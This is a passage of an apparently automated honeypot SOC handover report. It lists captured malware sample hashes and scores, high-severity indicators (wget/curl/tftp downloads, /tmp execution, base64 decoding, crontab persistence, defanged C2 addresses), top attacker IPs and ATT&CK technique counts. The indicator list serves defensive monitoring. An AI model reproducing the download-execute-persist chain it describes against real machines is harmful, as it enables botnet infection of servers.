|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `2.57.122[.]209` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `92.118.39[.]14` | RO | DMZHOST | **100** ⚠️ | 50 |
| `77.239.124[.]130` | FR | ROCKET & MARINICA LTD | **100** ⚠️ | 18 |
| `77.90.185[.]16` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `75.119.149[.]212` | FR | Contabo GmbH | **100** ⚠️ | 4 |
| `173.163.62[.]137` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `125.91.35[.]169` | CN | CHINANET Guangdong province network | **100** ⚠️ | 13 |
| `157.20.37[.]254` | ID | PT Ekarta Java Buana | **100** ⚠️ | 21 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 232 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 202 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 81 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 80 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 78 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 39 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 333 cases |
| Tool 34  | Credential Extractor        | ✅ 222 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 93 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (16.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 58 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 202 priority case(s) shown individually · 44 recon entry/entries in table (18 group(s) consolidating 49 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-03T19:13:50Z_
